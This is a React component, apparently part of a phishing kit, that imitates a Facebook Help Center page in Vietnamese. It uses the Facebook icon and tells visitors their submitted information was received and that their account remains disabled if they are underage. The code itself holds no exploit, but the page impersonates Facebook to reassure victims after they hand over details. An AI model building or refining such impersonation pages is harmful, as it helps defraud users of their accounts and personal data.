import icon from '@/assets/images/icon.webp';
import { useState, useEffect, useMemo } from 'react';

const SendInfo = () => {
    const defaultTexts = useMemo(
        () => ({
            title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.' ,
            description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
            description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            // 🎯 CHỈ LẤY TEXTS ĐÃ DỊCH TỪ LOCALSTORAGE - KHÔNG DỊCH LẠI
            const savedTexts = localStorage.getItem(`translatedSendInfo_${targetLang}`);
            if (savedTexts) {
                try {
                    setTranslatedTexts(JSON.parse(savedTexts));
                } catch (error) {
                    console.log('Error parsing saved sendInfo texts:', error);
                    // Giữ nguyên default texts nếu có lỗi
                }
            }
        }
        // 🚫 KHÔNG GỌI HÀM DỊCH NÀO Ở ĐÂY
    }, []);

    return (
        <div className='min-h-screen bg-gray-100'>
            {/* Header với Help Center */}
            <header className='bg-white border-b border-gray-300'>
                <div className='max-w-6xl mx-auto px-4 py-3'>
                    <div className='flex items-center justify-between'>
                        <div className='flex items-center space-x-3'>
                            <img 
                                src={icon} 
                                alt='Facebook' 
                                className='h-8 w-8'
                            />
                            <span className='text-lg font-semibold'>Trung tâm trợ giúp</span>
                        </div>
                    </div>
                </div>
            </header>

            {/* Main Content - SỬA PHẦN NÀY CHO MOBILE */}
            <main className='max-w-2xl mx-auto px-4 py-6 h-dvh md:h-auto'>
                <div className='bg-white rounded-lg shadow-sm border border-gray-300'>
                    {/* Title Section */}
                    <div className='px-6 py-6 border-b border-gray-300'>
                        <h1 className='text-xl font-bold text-gray-900'>
                            {translatedTexts.title}
                        </h1>
                    </div>

                    {/* Description Section */}
                    <div className='px-6 py-6 space-y-4'>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description1}
                        </p>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description2}
                        </p>
                    </div>
                </div>

                {/* Khoảng trắng phía dưới - dài hơn */}
                <div className='mt-16'></div>
                <div className='mt-16'></div>
            </main>
        </div>
    );
};

export default SendInfo;
